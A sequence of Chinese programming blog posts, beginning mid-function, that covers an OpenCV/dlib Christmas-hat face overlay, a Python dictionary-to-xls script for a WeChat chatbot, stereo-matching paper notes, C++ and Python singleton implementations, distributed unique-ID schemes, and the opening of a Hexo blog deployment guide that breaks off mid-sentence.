	face_cascade.detectMultiScale( frame_gray, faces, 1.1, 2, 0|CV_HAAR_SCALE_IMAGE, Size(30, 30) );

	for( size_t i = 0; i < faces.size(); i++ )
	{

		Point center( faces[i].x + faces[i].width/2, faces[i].y + faces[i].height/2 );
		// ellipse( frame, center, Size( faces[i].width/2, faces[i].height/2), 0, 0, 360, Scalar( 255, 0, 255 ), 2, 8, 0 );

		// line(frame,Point(faces[i].x,faces[i].y),center,Scalar(255,0,0),5);

		Mat faceROI = frame_gray( faces[i] );
		std::vector<Rect> eyes;

		//-- In each face, detect eyes
		eyes_cascade.detectMultiScale( faceROI, eyes, 1.1, 2, 0 |CV_HAAR_SCALE_IMAGE, Size(30, 30) );

		for( size_t j = 0; j < eyes.size(); j++ )
		{
			Point eye_center( faces[i].x + eyes[j].x + eyes[j].width/2, faces[i].y + eyes[j].y + eyes[j].height/2 );
			int radius = cvRound( (eyes[j].width + eyes[j].height)*0.25 );
			// circle( frame, eye_center, radius, Scalar( 255, 0, 0 ), 3, 8, 0 );
		}

		// if(eyes.size())
		{
			resize(hatAlpha,hatAlpha,Size(faces[i].width, faces[i].height),0,0,INTER_LANCZOS4);
			// mapToMat(hatAlpha,frame,center.x+2.5*faces[i].width,center.y-1.3*faces[i].height);
			mapToMat(hatAlpha,frame,faces[i].x,faces[i].y-0.8*faces[i].height);
		}
	}
	//-- Show what you got
	imshow( window_name, frame );
	imwrite("merry christmas.jpg",frame);
}

  下面是摄像头实时戴帽子，改下主函数就好了： int main( void )
{
	CvCapture* capture;
	//VideoCapture capture;
	Mat frame;

	//-- 1. Load the cascades
	if( !face_cascade.load( face_cascade_name ) ){ printf("--(!)Error loading\n"); return -1; };
	if( !eyes_cascade.load( eyes_cascade_name ) ){ printf("--(!)Error loading\n"); return -1; };

		//	frame = imread("19.jpg");//背景图片


			VideoCapture cap(0); //打开默认的摄像头号
			if(!cap.isOpened())  //检测是否打开成功
				return -1;

			Mat edges;
			//namedWindow("edges",1);
			for(;;)
			{
				Mat frame;
				cap >> frame; // 从摄像头中获取新的一帧
				detectAndDisplay( frame );
				//imshow("edges", frame);
				if(waitKey(30) >= 0) break;
			}
			//摄像头会在VideoCapture的析构函数中释放
			waitKey(0);
	
	return 0;
} 我的系统的是win10 64位的系统，之前摄像头出来都是黑的，发现需要用vs2010配置一下x64版本方可使用，查了半天还是自己之前写的博客靠谱：就是按照win7 x64来配置，完美运行 http://blog.csdn.net/wangyaninglm/article/details/16325283 效果：参考文献：http://blog.csdn.net/lonelyrains/article/details/50388999http://docs.opencv.org/doc/tutorials/objdetect/cascade_classifier/cascade_classifier.html我调试好的工程：点击打开链接﻿﻿一个python版本的代码：https://github.com/LiuXiaolong19920720/Add-Christmas-Hatimport numpy as np 
import cv2
import dlib

# 给img中的人头像加上圣诞帽，人脸最好为正脸
def add_hat(img,hat_img):
    # 分离rgba通道，合成rgb三通道帽子图，a通道后面做mask用
    r,g,b,a = cv2.split(hat_img) 
    rgb_hat = cv2.merge((r,g,b))

    cv2.imwrite("hat_alpha.jpg",a)

    # ------------------------- 用dlib的人脸检测代替OpenCV的人脸检测-----------------------
    # # 灰度变换
    # gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)  
    # # 用opencv自带的人脸检测器检测人脸
    # face_cascade = cv2.CascadeClassifier("haarcascade_frontalface_default.xml")                       
    # faces = face_cascade.detectMultiScale(gray,1.05,3,cv2.CASCADE_SCALE_IMAGE,(50,50))

    # ------------------------- 用dlib的人脸检测代替OpenCV的人脸检测-----------------------

    # dlib人脸关键点检测器
    predictor_path = "shape_predictor_5_face_landmarks.dat"
    predictor = dlib.shape_predictor(predictor_path)  

    # dlib正脸检测器
    detector = dlib.get_frontal_face_detector()

    # 正脸检测
    dets = detector(img, 1)

    # 如果检测到人脸
    if len(dets)>0:  
        for d in dets:
            x,y,w,h = d.left(),d.top(), d.right()-d.left(), d.bottom()-d.top()
            # x,y,w,h = faceRect  
            # cv2.rectangle(img,(x,y),(x+w,y+h),(255,0,0),2,8,0)

            # 关键点检测，5个关键点
            shape = predictor(img, d)
            # for point in shape.parts():
            #     cv2.circle(img,(point.x,point.y),3,color=(0,255,0))

            # cv2.imshow("image",img)
            # cv2.waitKey()  

            # 选取左右眼眼角的点
            point1 = shape.part(0)
            point2 = shape.part(2)

            # 求两点中心
            eyes_center = ((point1.x+point2.x)//2,(point1.y+point2.y)//2)

            # cv2.circle(img,eyes_center,3,color=(0,255,0))  
            # cv2.imshow("image",img)
            # cv2.waitKey()

            #  根据人脸大小调整帽子大小
            factor = 1.5
            resized_hat_h = int(round(rgb_hat.shape[0]*w/rgb_hat.shape[1]*factor))
            resized_hat_w = int(round(rgb_hat.shape[1]*w/rgb_hat.shape[1]*factor))

            if resized_hat_h > y:
                resized_hat_h = y-1

            # 根据人脸大小调整帽子大小
            resized_hat = cv2.resize(rgb_hat,(resized_hat_w,resized_hat_h))

            # 用alpha通道作为mask
            mask = cv2.resize(a,(resized_hat_w,resized_hat_h))
            mask_inv =  cv2.bitwise_not(mask)

            # 帽子相对与人脸框上线的偏移量
            dh = 0
            dw = 0
            # 原图ROI
            # bg_roi = img[y+dh-resized_hat_h:y+dh, x+dw:x+dw+resized_hat_w]
            bg_roi = img[y+dh-resized_hat_h:y+dh,(eyes_center[0]-resized_hat_w//3):(eyes_center[0]+resized_hat_w//3*2)]

            # 原图ROI中提取放帽子的区域
            bg_roi = bg_roi.astype(float)
            mask_inv = cv2.merge((mask_inv,mask_inv,mask_inv))
            alpha = mask_inv.astype(float)/255

            # 相乘之前保证两者大小一致（可能会由于四舍五入原因不一致）
            alpha = cv2.resize(alpha,(bg_roi.shape[1],bg_roi.shape[0]))
            # print("alpha size: ",alpha.shape)
            # print("bg_roi size: ",bg_roi.shape)
            bg = cv2.multiply(alpha, bg_roi)
            bg = bg.astype('uint8')

            cv2.imwrite("bg.jpg",bg)
            # cv2.imshow("image",img)
            # cv2.waitKey()

            # 提取帽子区域
            hat = cv2.bitwise_and(resized_hat,resized_hat,mask = mask)
            cv2.imwrite("hat.jpg",hat)
            
            # cv2.imshow("hat",hat)  
            # cv2.imshow("bg",bg)

            # print("bg size: ",bg.shape)
            # print("hat size: ",hat.shape)

            # 相加之前保证两者大小一致（可能会由于四舍五入原因不一致）
            hat = cv2.resize(hat,(bg_roi.shape[1],bg_roi.shape[0]))
            # 两个ROI区域相加
            add_hat = cv2.add(bg,hat)
            # cv2.imshow("add_hat",add_hat) 

            # 把添加好帽子的区域放回原图
            img[y+dh-resized_hat_h:y+dh,(eyes_center[0]-resized_hat_w//3):(eyes_center[0]+resized_hat_w//3*2)] = add_hat

            # 展示效果
            # cv2.imshow("img",img )  
            # cv2.waitKey(0)  

            return img

   
# 读取帽子图，第二个参数-1表示读取为rgba通道，否则为rgb通道
hat_img = cv2.imread("hat2.png",-1)

# 读取头像图
img = cv2.imread("test.jpg")
output = add_hat(img,hat_img)

# 展示效果
cv2.imshow("output",output )  
cv2.waitKey(0)  
cv2.imwrite("output.jpg",output)
# import glob as gb 

# img_path = gb.glob("./images/*.jpg")

# for path in img_path:
#     img = cv2.imread(path)

#     # 添加帽子
#     output = add_hat(img,hat_img)

#     # 展示效果
#     cv2.imshow("output",output )  
#     cv2.waitKey(0)  

cv2.destroyAllWindows()   








1.绪论
订阅号很早就有了，我最近闲了无事就像探索探索可以怎么玩。首先联想到就是微软小冰智能问答系统，还有很早时候有一个公众号提供了，根据c、c++函数名返回API具体用法的功能。那么这两个类似的功能如何实现呢。

2.接入智能问答系统
首先个人需要申请一个公众号，接着在图灵机器人的官网：http://www.tuling123.com/ 
注册一个号，选择添加微信公众号，直接扫码关联，ok，智能问答系统接入成功！

其实这个呢，是图灵机器人获取了微信的第三方接口，替你管理了微信号的消息回复功能，并且提供了下面的基本功能：其实比较简单，一些复杂的问题比如：给我订个到上海的机票，直接会回复去哪网的链接。相信这是图灵机器人的主要赚钱点，哈哈。

3.实现计算机专业英语辞典
那么类似提供c、c++ API 查询的功能是如何实现的呢？对于一个智能问答系统，API查询的功能其实可以抽象成一问一答的形式来做，由于暂时没有这方面的语料库，对于我们的公众号来说，哪一种功能比较类似呢？我想到了添加一个计算机专业英语的英译汉词典
首先我们来看看，图灵机器人提供的知识库模板：

很好理解，其实就是两列文本，第一列为问题，比如你叫什么，第二列为答案。 
这样的文本格式和词典也很好对应。于是我们上网找到一个txt格式的计算机专业英语基础英译汉词典：

观察发现，前面是英文后面是汉语释义，很好弄，python正则匹配一下，区分出英文和汉字出现的位置，完后写到xls格式的文件中对应的单词和释义就好了：结构如下（问题对应单词，答案对应释义）



问题
答案



单词
释义



**另外一个需要注意的点就是文件编码，python默认都是utf-8的。 
  所以一般咱们txt这块处理中文都是得用gbk系列的（比如gb2312），在python中处理的时候都转换成unicode统一搞**


python代码如下：主要使用了可以操作excel文件的xlwt库，和正则表达式库re

# -*- coding: utf-8 -*-
"""
Spyder Editor

write data to xls,2016.7.24
主要实现将一些其他格式的数据转化成，图灵机器人可以识别的xls格式数据
"""
import os
import xlwt
import re

knowledge = []

def set_style(name,height,bold = False):
    style = xlwt.XFStyle()     #初始化样式

    font = xlwt.Font()    #为样式创建字体
    font.name = name
    font.bold = bold
    font.color_index = 4
    font.height = height

    style.font = font
    return style


def write_excel(knowledge):
    #创建xls工作薄
    workbook = xlwt.Workbook(encoding = 'utf-8')
    #创建sheet
    data_sheet = workbook.add_sheet('first')

    for i in range(len(knowledge)):
        data_sheet.write(i,0,knowledge[i][0])
        data_sheet.write(i,1,knowledge[i][1])

    #保存文件
    workbook.save('answer.xls')
    print "successful write!"

x=xlwt.Workbook()
s1=x.add_sheet('sheet1')

if __name__ == '__main__':

    info = open("know.txt")
    print "中文"
    #a = info.readlines()
    #print a
    for line in info:
        line = line.decode('GB2312').encode('utf-8')
        #print line 这块也可以整行进行拆分
       # letter_str = re.findall(r'([a-zA-Z]+)',line,re.MULTILINE)
        #hanzi_str = re.findall(r"([\x80-\xff]+)", line,re.MULTILINE)
        #找到第一个出现汉字字符的位置，进行截断，分成两部分，分别写到两列中
        hanstr = ''
        yingstr = ''
        index = 0
        for i in line:
            an = re.match(r"([\x80-\xff]+)", i)#判断一下是中文
            if an:
                break
            else:
                index = index +1
        yingstr = line[0:index]
        hanstr = line[index:len(line)]

        print index       
        print hanstr
        str = [yingstr,hanstr]
        knowledge.append(str)

    write_excel(knowledge)



'''
下面使用库xlwt进行操作excel文件的一些代码，希望大家有空能够用到
style1=xlwt.XFStyle() #样式类
style1.font.colour_index=30 #字体颜色前景色为红
style1.font.bold=True #粗体
style1.pattern.pattern=1 #填充solid
style1.pattern.pattern_fore_colour=2 #填充颜色红色
style2=xlwt.easyxf('font:italic on;pattern:pattern solid,fore-colour yellow')
#快速生成样式
#参数字符串格式： 
#"class1:key1 value1,key2 value2;class2:k1 v1,k2 v2;"



s1.write(0,0,"Hello",style1)#写入字符串
s1.write(1,0,True,style2)#写入真值
s1.write(2,0,3.1415926);s1.write(2,1,-5);s1.write(2,2,xlwt.Formula("2*A3*ABS(B3)"));
#使用公式计算
s1.write(3,0,'right',xlwt.easyxf("align:horiz right"))
#调整对齐方式
x.save('example.xls') #保存

'''
处理好的文件：

然后导入图灵机器人的知识库：

然后我们的订阅号就可以自动识别啦，那些查询的功能和词典大同小异，我想应该也是这么实现的吧。
4.实现效果

参考：（主要是编码转换和正则表达式）
http://bbs.csdn.net/topics/100172542 
（正则表达式中汉语范围出自上面帖子的六楼，网上搜到的[\u4e00-\u9fa5]这个不是很好使，还请大牛指点一二） 
http://blog.chinaunix.net/uid-21633169-id-4396998.html 
xlwt使用介绍： 
http://blog.csdn.net/wangkai_123456/article/details/50457284 






写大论文的时候看到了这篇文章，感叹到作者科研的创新
《A Non-Local Cost Aggregation Method for Stereo Matching》
一种非局部代价聚合立体匹配方法
 
        对于基于局部信息的立体匹配，采用的一般都是滑动窗口，作者创造性的提出使用最小生成树并结合其性质完成了全局代价聚合的值传递工作，效果很好，而且有代码实现：
 
Paper：
http://www.cs.cityu.edu.hk/~qiyang/publications/cvpr-12/cvpr-12-qingxiong-yang.pdf
Code：
http://www.cs.cityu.edu.hk/~qiyang/publications/cvpr-12/code/
 
 
介绍文章1：
http://blog.csdn.net/wsj998689aa/article/details/45041547
介绍文章2：
http://www.bubuko.com/infodetail-668886.html
 
     效果还不错：整体上完全达到了全局优化算法的水平，而且算法在时间上基本能够满足实时性的要求，如果通过分析代码性能加以优化，或者引入并行计算的算法，实时计算不是没有可能。后续准备详细分析改良一下这个算法，作为一个创新点好好学习一下。
 
 
 
    改进的文章：根据本文开头文章的思想进行了改进
Segment-Tree based Cost Aggregation for Stereo Matching
基本思路是分割后每一块作为一个最小生成树，类似分层的最小生成树，其实就是减少MST中的节点数目。
 
文章分析：
http://blog.csdn.net/wsj998689aa/article/details/48033819
 
 
        当初研究图割算法，跟着思路一路看文章过来，从图像分割开始看起，渐渐的看到立体匹配这块，开始一直做立体匹配的相关内容，后来发现看文章实在看的太少了。而且高档次的文章看的更少，以至于停留在非常低端已经很成熟的方法的改进中不能自拔，现在要毕业了才想起看文章去写国内外的研究背景，却突然给我了很多idea，但是时间确实有限，希望刚接触这个的同行们从这些人的成果中多少有点启示，我提两点趋势：
 
1.算法的并行性，立体匹配好的算法不一定要求多高的精度，我认为实时性是最重要的，例如工业控制，和无人驾驶汽车，机器人导航对实时性的要求。
 
2.组合的算法（综合起来的工程性算法），立体匹配作为一个已经应用在实际工业领域的研究问题，是一个复杂的工业或者说工程问题，是自成体系的问题，没有一个复杂的的算法能够一蹴而就的解决问题，需要从头到尾多个算法的组合。
甚至不夸张的说，从源头的摄像机矫正开始下功夫，直到最后面的交叉检验视差求精，每一个环节将误差和计算量降低到最少，各个环节的改进都能为整体流程做贡献，而这些正是我们做工程的魅力所在，一点一滴精益求精。
 
3.创新性，立体匹配上进行创新，需要在立体匹配的整个过程和应用场景上下功夫，比如特定目标的立体匹配。对目标图像进行目标检测后的行人立体匹配等，我认为都可以作为一个研究思路，将算法组合起来，完成一个特定的需求，而这本身就偏应用了。
 
 
 
 









前段时间去考了系统架构师，排错题基本全是设计模式的内容。设计模式真的这么重要么？答案是肯定的，没有设计模式就没有现在复杂的软件系统。
于是，我想要慢慢的花两个月时间，重拾语言关，再者c++的设计模式网上实现比较少，我就来帮助大家搜集一下，当然实现方式还是我喜欢的c，c++，python三种语言分别实现。
Christopher Alexander 说过：“每一个模式描述了一个在我们周围不断重复发生的问题，以及该问题的解决方案的核心，这样，你就能一次又一次地使用该方案而不必做重复劳动。”第一个设计模式，我选择单例模式


1.设计模式纵览



1、单一职责原则（Single Responsibility Principle） 
  就一个类而言，应该仅有一个引起它变化的原因。一个类只做一件事。 
2、开闭原则（Open Close Principle） 
  对扩展开放，对修改关闭。 
3、里氏代换原则（Liskov Substitution Principle） 
  任何基类可以出现的地方，子类一定可以出现。 
4、依赖倒转原则（Dependence Inversion Principle） 
  真对接口编程，依赖于抽象而不依赖于具体。 
5、接口隔离原则（Interface Segregation Principle） 
  使用多个隔离的接口，比使用单个接口要好。 
6、迪米特法则（最少知道原则）（Demeter Principle） 
  一个实体应当尽量少的与其他实体之间发生相互作用，使得系统功能模块相对独立。


2.单例模式应该考虑线程安全!
单例模式的应用场景
有很多地方需要单例模式这样的功能模块，如系统的日志输出，GUI应用必须是单鼠标，MODEM的联接需要一条且只需要一条电话线，操作系统只能有一个窗口管理器，一台PC连一个键盘。  
通过单例模式， 可以做到：  
（1）确保一个类只有一个实例被建立  
（2）提供了一个对对象的全局访问指针  
（3）在不影响单例类的客户端的情况下允许将来有多个实例
2.1 教科书里的单例模式
我们都很清楚一个简单的单例模式该怎样去实现：构造函数声明为private或protect防止被外部函数实例化，内部保存一个private static的类指针保存唯一的实例，实例的动作由一个public的类方法代劳，该方法也返回单例类唯一的实例。 
上代码：
class singleton
{
protected:
    singleton(){}
private:  
    static singleton* p;
public:  
    static singleton* instance();
};

singleton* singleton::p = NULL;

singleton* singleton::instance()
{  
   if (p == NULL) 
       p = new singleton(); 
    return p;
 }
这是一个很棒的实现，简单易懂。但这是一个完美的实现吗？不！该方法是线程不安全的，考虑两个线程同时首次调用instance方法且同时检测到p是NULL值，则两个线程会同时构造一个实例给p，这是严重的错误！同时，这也不是单例的唯一实现！
2.2 懒汉与饿汉
单例大约有两种实现方法：懒汉与饿汉。 
懒汉：故名思义，不到万不得已就不会去实例化类，也就是说在第一次用到类实例的时候才会去实例化，所以上边的经典方法被归为懒汉实现； 
饿汉：饿了肯定要饥不择食。所以在单例类定义的时候就进行实例化。 
特点与选择： 
由于要进行线程同步，所以在访问量比较大，或者可能访问的线程比较多时，采用饿汉实现，可以实现更好的性能。这是以空间换时间。 
在访问量较小时，采用懒汉实现。这是以时间换空间。
2.3 线程安全的懒汉实现
线程不安全，怎么办呢？最直观的方法：加锁。访问量大有可能成为严重的性能瓶颈
方法1： 
加锁的经典懒汉实现：
class singleton
{
protected:
  singleton() {}
private:
  static singleton* p;
public: 
   static pthread_mutex_t mutex;  
   static singleton* initance();
 }; 

pthread_mutex_t singleton::mutex;
singleton* singleton::p = NULL;

singleton* singleton::initance()
{ 
    if (p == NULL) 
    {   
        pthread_mutex_lock(&mutex);  
        if (p == NULL)    
            p = new singleton(); 
        pthread_mutex_unlock(&mutex);  
    } 
    return p;
}

方法2：内部静态变量的懒汉实现 
此方法也很容易实现，在instance函数里定义一个静态的实例，也可以保证拥有唯一实例，在返回时只需要返回其指针就可以了。推荐这种实现方法，真得非常简单。
class singleton 
{ 
protected: 
singleton()
{    
      pthread_mutex_init(&mutex);
}
public: 
    static pthread_mutex_t mutex; 
    static singleton* initance();  
    int a; 
};  

pthread_mutex_t singleton::mutex;

singleton* singleton::initance()
{   
    pthread_mutex_lock(&mutex);  
    static singleton obj; 
    pthread_mutex_unlock(&mutex);  
    return &obj; 
}

4 饿汉实现 
为什么我不讲“线程安全的饿汉实现”？因为饿汉实现本来就是线程安全的，不用加锁。为啥？自己想！
class singleton
{
protected:
  singleton()  {}
private:  
static singleton* p;
public:  
static singleton* initance();
};

singleton* singleton::p = new singleton;

singleton* singleton::initance()
{  
return p;
}
是不是特别简单呢？以空间换时间，你说简单不简单？ 
面试的时候，线程安全的单例模式怎么写？肯定怎么简单怎么写呀！饿汉模式反而最懒！　 
windows 下这么写：
#include "stdafx.h"

using namespace std;

class SingletonStatic
{
private:
    static const SingletonStatic* m_instance;
    SingletonStatic() {}

public:
    static const SingletonStatic* getInstance()
    {
        return m_instance;
    }
};

//外部初始化 before invoke main
const SingletonStatic* SingletonStatic::m_instance = new SingletonStatic;

int main()
{
    const SingletonStatic* temp_instance = SingletonStatic::getInstance();
    return 0;
}


单例的析构
C++单例模式类CSingleton有以下特征：
它有一个指唯一实例的静态指针m_pInstance，并且是私有的。
它有一个公有的函数，可以获取这个唯一的实例，并在需要的时候创建该实例。
它的构造函数是私有的，这样就不能从别处创建该类的实例。
大多时候，这样的实现都不会出现问题。有经验的读者可能会问，m_pInstance指向的空间什么时候释放呢？更严重的问题是，这个实例的析构操作什么时候执行？
如果在类的析构行为中有必须的操作，比如关闭文件，释放外部资源，那么上面所示的代码无法实现这个要求。我们需要一种方法，正常地删除该实例。
可以在程序结束时调用GetInstance并对返回的指针调用delete操作。这样做可以实现功能，但是不仅很丑陋，而且容易出错。因为这样的附加代码很容易被忘记，而且也很难保证在delete之后，没有代码再调用GetInstance函数。
一个妥善的方法是让这个类自己知道在合适的时候把自己删除。或者说把删除自己的操作挂在系统中的某个合适的点上，使其在恰当的时候自动被执行。
我们知道，程序在结束的时候，系统会自动析构所有的全局变量。事实上，系统也会析构所有的类的静态成员变量，就像这些静态成员也是全局变量一样。利用这个特征，我们可以在单例类中定义一个这样的静态成员变量，而它的唯一工作就是在析构函数中删除单例类的实例。如下面的代码中的CGarbo类（Garbo意为垃圾工人）：
class CSingleton:
{
    // 其它成员  
public:  
    static CSingleton * GetInstance()  
private:  
    CSingleton(){};  
    static CSingleton * m_pInstance;  
    class CGarbo // 它的唯一工作就是在析构函数中删除CSingleton的实例  
    {
    public:
        ~CGarbo()
        {  
            if (CSingleton::m_pInstance)
                delete CSingleton::m_pInstance;
        }
    };
    static CGarbo Garbo; // 定义一个静态成员，在程序结束时，系统会调用它的析构函数
};
类CGarbo被定义为CSingleton的私有内嵌类，以防该类被在其它地方滥用。
在程序运行结束时，系统会调用CSingleton的静态成员Garbo的析构函数，该析构函数会删除单例的唯一实例。
使用这种方法释放C++单例模式对象有以下特征：
在单例类内部定义专有的嵌套类。
在单例类内定义私有的专门用于释放的静态成员。
利用程序在结束时析构全局变量的特性，选择最终的释放时机。
使用C++单例模式的代码不需要任何操作，不必关心对象的释放 
c++11中的单例模式 
使用c++11中的可变参数模版完成通用的单例模式 
http://www.cnblogs.com/qicosmos/p/3145019.html

3.python需要单例么？
python2和python3的运行结果还有差异
#-*- encoding=utf-8 -*-

'''
date = 20171127
Singleton pattern
'''
###经典单例模式的实现
class Singleton(object):
    def __new__(cls, *args, **kwargs):
        if not hasattr(cls,'_instance'):
            org = super(Singleton,cls)
            cls._instance = org.__new__(cls)#cls,*args,**kwargs)
        return cls._instance


#############################################################
class Singleton2(type):
    def __init__(cls,name,bases,dict):
        super(Singleton2, cls).__init__(name,bases,dict)
        cls._instance = None
    def __call__(cls  , *args, **kwargs):
        if cls._instance is None:
            cls._instance = super(Singleton2,cls).__call__(*args,**kwargs)
        return cls._instance

class Myclass(object):
    __metaclass__ = Singleton2


one = Myclass()
two = Myclass()

print(id(one))
print(id(two))

###############################################
def singleton3(cls, *args, **kw):
    instances = {}
    def _singleton():
        if cls not in instances:
            instances[cls] = cls(*args, **kw)
        return instances[cls]
    return _singleton

@singleton3
class Myclass2(object):
    a = 1
    def __init__(self, x=0):
        self.x = x

three = Myclass2()
four = Myclass2()

print(id(three))
print(id(four))

#######################################

if __name__=='__main__':
    class SingleSpam(Singleton):
        def __init__(self,s):
            self.s = s

        def __str__(self):
            return self.s


    s1 = SingleSpam('shiter')
    print( id(s1),s1)
    s2 = SingleSpam('wynshiter')
    print(id(s2), s2)


python3运行结果

python2运行结果


4.c语言设计模式也存在吗？
讨论帖子：
http://bbs.csdn.net/topics/392290682

zookeeper分布式协调服务
分布式系统唯一ID生成方案汇总（下一篇）
1. 数据库自增长序列或字段
最常见的方式。利用数据库，全数据库唯一。 
优点： 
1）简单，代码方便，性能可以接受。 
2）数字ID天然排序，对分页或者需要排序的结果很有帮助。
缺点： 
1）不同数据库语法和实现不同，数据库迁移的时候或多数据库版本支持的时候需要处理。 
2）在单个数据库或读写分离或一主多从的情况下，只有一个主库可以生成。有单点故障的风险。 
3）在性能达不到要求的情况下，比较难于扩展。 
4）如果遇见多个系统需要合并或者涉及到数据迁移会相当痛苦。 
5）分表分库的时候会有麻烦。 
优化方案： 
1）针对主库单点，如果有多个Master库，则每个Master库设置的起始数字不一样，步长一样，可以是Master的个数。比如：Master1 生成的是 1，4，7，10，Master2生成的是2,5,8,11 Master3生成的是 3,6,9,12。这样就可以有效生成集群中的唯一ID，也可以大大降低ID生成数据库操作的负载。
2. UUID
常见的方式。可以利用数据库也可以利用程序生成，一般来说全球唯一。 
优点： 
1）简单，代码方便。 
2）生成ID性能非常好，基本不会有性能问题。 
3）全球唯一，在遇见数据迁移，系统数据合并，或者数据库变更等情况下，可以从容应对。
缺点： 
1）没有排序，无法保证趋势递增。 
2）UUID往往是使用字符串存储，查询的效率比较低。 
3）存储空间比较大，如果是海量数据库，就需要考虑存储量的问题。 
4）传输数据量大 
5）不可读。

UUID的变种 
1）为了解决UUID不可读，可以使用UUID to Int64的方法。及

///  
/// 根据GUID获取唯一数字序列 
///  
public static long GuidToInt64() 
{ 
    byte[] bytes = Guid.NewGuid().ToByteArray(); 
    return BitConverter.ToInt64(bytes, 0); 
}
1 
2）为了解决UUID无序的问题，NHibernate在其主键生成方式中提供了Comb算法（combined guid/timestamp）。保留GUID的10个字节，用另6个字节表示GUID生成的时间（DateTime）。
///   
/// Generate a new  using the comb algorithm.  
///   
private Guid GenerateComb() 
{ 
    byte[] guidArray = Guid.NewGuid().ToByteArray();
DateTime baseDate = new DateTime(1900, 1, 1);
DateTime now = DateTime.Now;

// Get the days and milliseconds which will be used to build    
//the byte string    
TimeSpan days = new TimeSpan(now.Ticks - baseDate.Ticks);
TimeSpan msecs = now.TimeOfDay;

// Convert to a byte array        
// Note that SQL Server is accurate to 1/300th of a    
// millisecond so we divide by 3.333333    
byte[] daysArray = BitConverter.GetBytes(days.Days);
byte[] msecsArray = BitConverter.GetBytes((long)
  (msecs.TotalMilliseconds / 3.333333));

// Reverse the bytes to match SQL Servers ordering    
Array.Reverse(daysArray);
Array.Reverse(msecsArray);

// Copy the bytes into the guid    
Array.Copy(daysArray, daysArray.Length - 2, guidArray,
  guidArray.Length - 6, 2);
Array.Copy(msecsArray, msecsArray.Length - 4, guidArray,
  guidArray.Length - 4, 4);

return new Guid(guidArray);

}
用上面的算法测试一下，得到如下的结果：作为比较，前面3个是使用COMB算法得出的结果，最后12个字符串是时间序（统一毫秒生成的3个UUID），过段时间如果再次生成，则12个字符串会比图示的要大。后面3个是直接生成的GUID。
如果想把时间序放在前面，可以生成后改变12个字符串的位置，也可以修改算法类的最后两个Array.Copy。
4. Redis生成ID
当使用数据库来生成ID性能不够要求的时候，我们可以尝试使用Redis来生成ID。这主要依赖于Redis是单线程的，所以也可以用生成全局唯一的ID。可以用Redis的原子操作 INCR和INCRBY来实现。 
可以使用Redis集群来获取更高的吞吐量。假如一个集群中有5台Redis。可以初始化每台Redis的值分别是1,2,3,4,5，然后步长都是5。各个Redis生成的ID为： 
A：1,6,11,16,21 
B：2,7,12,17,22 
C：3,8,13,18,23 
D：4,9,14,19,24 
E：5,10,15,20,25 
这个，随便负载到哪个机确定好，未来很难做修改。但是3-5台服务器基本能够满足器上，都可以获得不同的ID。但是步长和初始值一定需要事先需要了。使用Redis集群也可以方式单点故障的问题。 
另外，比较适合使用Redis来生成每天从0开始的流水号。比如订单号=日期+当日自增长号。可以每天在Redis中生成一个Key，使用INCR进行累加。
优点： 
1）不依赖于数据库，灵活方便，且性能优于数据库。 
2）数字ID天然排序，对分页或者需要排序的结果很有帮助。 
缺点： 
1）如果系统中没有Redis，还需要引入新的组件，增加系统复杂度。 
2）需要编码和配置的工作量比较大。

Twitter的snowflake算法 
snowflake是Twitter开源的分布式ID生成算法，结果是一个long型的ID。其核心思想是：使用41bit作为毫秒数，10bit作为机器的ID（5个bit是数据中心，5个bit的机器ID），12bit作为毫秒内的流水号（意味着每个节点在每毫秒可以产生 4096 个 ID），最后还有一个符号位，永远是0。具体实现的代码可以参看https://github.com/twitter/snowflake。

snowflake算法可以根据自身项目的需要进行一定的修改。比如估算未来的数据中心个数，每个数据中心的机器数以及统一毫秒可以能的并发数来调整在算法中所需要的bit数。 
优点： 
1）不依赖于数据库，灵活方便，且性能优于数据库。 
2）ID按照时间在单机上是递增的。 
缺点： 
1）在单机上是递增的，但是由于涉及到分布式环境，每台机器上的时钟不可能完全同步，也许有时候也会出现不是全局递增的情况。

利用zookeeper生成唯一ID

zookeeper主要通过其znode数据版本来生成序列号，可以生成32位和64位的数据版本号，客户端可以使用这个版本号来作为唯一的序列号。 
很少会使用zookeeper来生成唯一ID。主要是由于需要依赖zookeeper，并且是多步调用API，如果在竞争较大的情况下，需要考虑使用分布式锁。因此，性能在高并发的分布式环境下，也不甚理想。

MongoDB的ObjectId 
MongoDB的ObjectId和snowflake算法类似。它设计成轻量型的，不同的机器都能用全局唯一的同种方法方便地生成它。MongoDB 从一开始就设计用来作为分布式数据库，处理多个节点是一个核心要求。使其在分片环境中要容易生成得多。 
其格式如下：

前4 个字节是从标准纪元开始的时间戳，单位为秒。时间戳，与随后的5 个字节组合起来，提供了秒级别的唯一性。由于时间戳在前，这意味着ObjectId 大致会按照插入的顺序排列。这对于某些方面很有用，如将其作为索引提高效率。这4 个字节也隐含了文档创建的时间。绝大多数客户端类库都会公开一个方法从ObjectId 获取这个信息。  
接下来的3 字节是所在主机的唯一标识符。通常是机器主机名的散列值。这样就可以确保不同主机生成不同的ObjectId，不产生冲突。  
为了确保在同一台机器上并发的多个进程产生的ObjectId 是唯一的，接下来的两字节来自产生ObjectId 的进程标识符（PID）。  
前9 字节保证了同一秒钟不同机器不同进程产生的ObjectId 是唯一的。后3 字节就是一个自动增加的计数器，确保相同进程同一秒产生的ObjectId 也是不一样的。同一秒钟最多允许每个进程拥有2563（16 777 216）个不同的ObjectId。 
实现的源码可以到MongoDB官方网站下载。 









文章大纲1. 不同代码仓库部署coding部署方式项目名称配置 SSH 公钥访问 git 仓库github码云2. 手动cdn，智能解析3. 添加评论系统4. 博客置顶5. 页脚统计信息5. NexT 6 添加字数和阅读时间统计本人博客效果主页内容及评论系统优秀博客链接参考

1. 不同代码仓库部署
不同代码仓库部署，并发布的主要原因如下；

代码备份  （哪天贸易战打的，github 不能用了也不是没有可能）
相当于手动智能解析与CDN加速  （国外ip 转发到github，国内转发到coding）

以下主要介绍使用 腾讯云开发者平台的coding 进行部署博客，github 教程网上很多，就不列举了。
整体过程也可以参考：Hexo系列：（三）Hexo博客部署到GitHub和Coding

coding
coding 之前 和腾讯云达成了战略合作协议，还有web IDE，运行环境的切换、发布和分享

上图是一个在线命令行贪吃蛇，内置的，很有意思。
部署方式
在Coding上部署博客网上提供有两种方式，我们直接用和github 一样的方式pages。
通过coding pages的方式进行博客的部署.coding为每个项目都推出了pages,不管是公有的还是私有的都有pages功能.推荐这种方式去搭建Hexo Coding博客.有很多好处,比如说免费,比如说可以绑定域名等等吧.
项目名称
最好创建跟Global Key相同的项目这样访问起来直接就是
